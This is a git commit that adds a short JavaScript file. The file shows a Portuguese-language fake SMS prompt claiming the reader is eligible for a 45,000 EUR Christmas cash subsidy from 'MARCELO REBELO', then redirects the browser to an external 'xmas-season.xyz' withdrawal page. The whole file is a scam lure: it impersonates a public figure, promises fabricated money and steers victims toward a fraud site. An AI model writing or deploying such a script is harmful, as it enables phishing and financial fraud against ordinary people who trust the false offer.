450a821a7bd58a561e0b424be282a83a3751da96
bigetijazz14 <bigetijazz14@gmail.com>
2024-12-09 21:05:24 -0800

    Create portuggrant.js

---
+++ portuggrant.js
@@ -0,0 +1,6 @@
+
+var password = 'RECLAMAÇÃO 45000 EUR'
+password=prompt('SMS: Parabéns, é elegível para MARCELO REBELO 45000 EUR SUBSÍDIO EM DINHEIRO DE NATAL PARA TODOS, Por favor pressione OK para RECLAMAÇÃO Prémio em Dinheiro','RECLAMAÇÃO 45000 EUR');
+if (password != 'RECLAMAÇÃO 45000 EUR') {
+location.href='https://www.xmas-season.xyz/retirar-45000EUR';
+}
